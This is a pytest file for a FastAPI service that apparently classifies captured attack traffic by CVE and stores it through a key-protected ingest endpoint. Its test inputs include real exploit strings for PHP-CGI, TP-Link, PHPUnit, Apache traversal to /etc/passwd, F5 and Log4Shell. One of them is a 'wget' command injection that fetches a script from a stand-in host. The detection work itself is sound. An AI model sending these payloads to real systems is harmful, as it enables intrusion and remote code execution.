from fastapi.testclient import TestClient

from app import classify, db, geoip, main

client = TestClient(main.app)


def test_classify_cve_2024_4577():
    probe = classify.classify("GET", "/php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input", "")
    assert probe == {"classification": "targeted", "stage": "probe", "cve_id": "CVE-2024-4577"}
    exploit = classify.classify(
        "POST", "/?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input", "<?php system('id'); ?>"
    )
    assert exploit == {"classification": "targeted", "stage": "exploit", "cve_id": "CVE-2024-4577"}


def test_classify_high_volume_cves():
    tplink = classify.classify("POST", "/cgi-bin/luci/;stok=/locale?form=country", "country=$(wget http://x/a.sh)")
    assert tplink == {"classification": "targeted", "stage": "exploit", "cve_id": "CVE-2023-1389"}
    assert classify.classify("POST", "/cgi-bin/luci/;stok=/locale?form=country", "")["stage"] == "probe"
    phpunit = classify.classify("POST", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "<?php echo md5('x');")
    assert phpunit["cve_id"] == "CVE-2017-9841" and phpunit["stage"] == "exploit"
    apache = classify.classify("GET", "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd", "")
    assert apache == {"classification": "targeted", "stage": "probe", "cve_id": "CVE-2021-41773"}
    f5 = classify.classify("POST", "/mgmt/tm/util/bash", '{"command":"run","utilCmdArgs":"-c id"}')
    assert (f5["classification"], f5["cve_id"]) == ("noise", "CVE-2022-1388")  # recognised, not impersonated


def test_classify_noise():
    assert classify.classify("GET", "/", "")["stage"] == "recon"
    assert classify.classify("GET", "/.env", "") == {"classification": "noise", "stage": "probe", "cve_id": None}
    log4j = classify.classify("GET", "/", "", {"User-Agent": "${jndi:ldap://x/a}"})
    assert (log4j["classification"], log4j["cve_id"], log4j["stage"]) == ("noise", "CVE-2021-44228", "exploit")


def test_ingest_requires_key_and_stores(tmp_path, monkeypatch):
    monkeypatch.setattr(db, "DB_PATH", tmp_path / "cap.db")
    monkeypatch.setattr(db, "DATABASE_URL", None)
    monkeypatch.setattr(main, "INGEST_KEY", "k")
    monkeypatch.setattr(
        geoip, "lookup", lambda conn, ips: {"45.33.32.156": {"asn": 14061, "country_code": "NL", "lat": 52.4, "lng": 4.9}}
    )
    hits = [
        {"id": "h1", "source_ip": "45.33.32.156", "port": 80, "timestamp": db.now_iso(), "method": "GET",
         "path": "/?%ADd+allow_url_include%3d1", "headers": {}, "body_preview": ""},
        {"id": "h2", "source_ip": "127.0.0.1", "port": 80, "timestamp": db.now_iso(), "method": "GET",
         "path": "/"},  # no test flag: loopback alone marks it as test
    ]
    assert client.post("/ingest/events", json=hits).status_code == 401
    assert client.post("/ingest/events", json=hits, headers={"X-Ingest-Key": "nope"}).status_code == 401
    ok = client.post("/ingest/events", json=hits, headers={"X-Ingest-Key": "k"})
    assert ok.json() == {"received": 2, "stored": 2}
    again = client.post("/ingest/events", json=hits, headers={"X-Ingest-Key": "k"})
    assert again.json()["stored"] == 0  # idempotent on hit id

    events = client.get("/api/events").json()
    assert len(events) == 1  # test hit hidden
    e = events[0]
    assert (e["classification"], e["cve_id"], e["asn"], e["lat"]) == ("targeted", "CVE-2024-4577", 14061, 52.4)
    assert client.get("/api/stats").json()["total_hits"] == 1


def test_ingest_disabled_without_key(monkeypatch):
    monkeypatch.setattr(main, "INGEST_KEY", "")
    assert client.post("/ingest/events", json=[], headers={"X-Ingest-Key": ""}).status_code == 401
